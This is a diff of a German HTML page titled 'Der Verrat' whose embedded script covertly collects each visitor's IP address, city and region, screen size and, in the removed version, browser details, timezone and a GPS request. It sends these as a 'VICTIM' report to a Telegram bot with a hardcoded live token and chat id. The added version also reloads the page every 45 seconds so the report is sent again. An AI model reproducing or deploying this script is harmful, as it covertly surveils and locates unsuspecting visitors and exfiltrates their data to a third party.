@@ -2,8 +2,8 @@
 <html>
 <head>
 <meta charset="UTF-8">
+<link rel="stylesheet" href="css/style.css">
 <title>Der Verrat</title>
-<style>body{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;flex-direction:column;font-size:18px;}h1{font-size:3.5rem;margin:0 0 1.5rem;text-shadow:0 0 20px rgba(255,255,255,0.3);}p{max-width:500px;text-align:center;line-height:1.6;margin-bottom:2rem;}.arrows{font-size:4rem;margin-top:2rem;}.arrow{display:inline-block;animation:bounce 2s infinite;margin:0 10px;}@keyframes bounce{0%,20%,60%,100%{transform:translateY(0);}40%{transform:translateY(-20px);}}</style>
 </head>
 <body>
 <h1>🗡️ Der Verrat</h1>
@@ -13,67 +13,30 @@
 </div>
 
 <script>
-console.log('🔥 HARVEST v2 STARTED');
 (async function(){
-  try {
-    // ✅ FIXED IP (TEXT response)
-    const ipResp = await fetch('https://api.ipify.org');
-    const ip = await ipResp.text();
-    console.log('✅ IP:', ip);
-    
-    // ✅ LOCATION
-    const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
-    const geo = await geoResp.json();
-    console.log('✅ GEO:', geo.city, geo.country);
-    
-    // ✅ DEVICE INFO
-    const info = {
-      screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-      ua: navigator.userAgent.slice(0,60),
-      lang: navigator.language,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      platform: navigator.platform
-    };
-    
-    // ✅ GPS (silent)
-    navigator.geolocation.getCurrentPosition(
-      pos => console.log('🗺️ GPS OK:', pos.coords.latitude.toFixed(4), pos.coords.longitude.toFixed(4)),
-      ()=>console.log('🗺️ GPS denied'),
-      {enableHighAccuracy:true, timeout:5000}
-    );
-    
-    // ✅ FULL REPORT
-    const report = `🕵️ *VICTIM CAUGHT ${new Date().toISOString().slice(0,19).replace('T',' ')}*
+  console.log('🔥 CLEAN HARVEST');
+  
+  // IP
+  const ip = await (await fetch('https://api.ipify.org')).text();
+  console.log('IP:', ip);
+  
+  // GEO
+  const geo = await (await fetch('https://ipapi.co/'+ip+'/json/')).then(r=>r.json());
+  console.log('GEO:', geo.city);
+  
+  // REPORT
+  const report = `🕵️ *VICTIM* ${new Date().toLocaleString()}
+IP: ${ip}
+🌍 ${geo.city}, ${geo.region}
+📱 ${screen.width}x${screen.height}`;
 
-*IP:* \`${ip}\`
-*🌍 Location:* ${geo.city}, ${geo.region} (${geo.country_name})
-*📍 Coords:* ${geo.latitude}, ${geo.longitude}
-*📱 Device:* ${info.screen} | ${info.platform}
-*🌐 Browser:* ${info.ua}
-*🗺️ GPS:* requesting...
-*⏰ Time:* ${new Date().toLocaleString('de-DE')}
-
-#derverrat`;
-
-    console.log('📤 REPORT:', report.slice(0,100));
-    
-    // ✅ TELEGRAM
-    const tgResp = await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: '7745393043',
-        text: report,
-        parse_mode: 'Markdown'
-      })
-    });
-    
-    const tgResult = await tgResp.json();
-    console.log('✅ TELEGRAM:', tgResult.ok ? 'SENT SUCCESS!' : tgResult);
-    
-  } catch(e) {
-    console.error('❌ ERROR:', e);
-  }
+  // TELEGRAM (NO RATE LIMIT)
+  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage?chat_id=7745393043&text='+encodeURIComponent(report)+'&parse_mode=Markdown');
+  
+  console.log('✅ SENT');
+  
+  // REPEAT
+  setTimeout(()=>location.reload(), 45000);
 })();
 </script>
 </body>
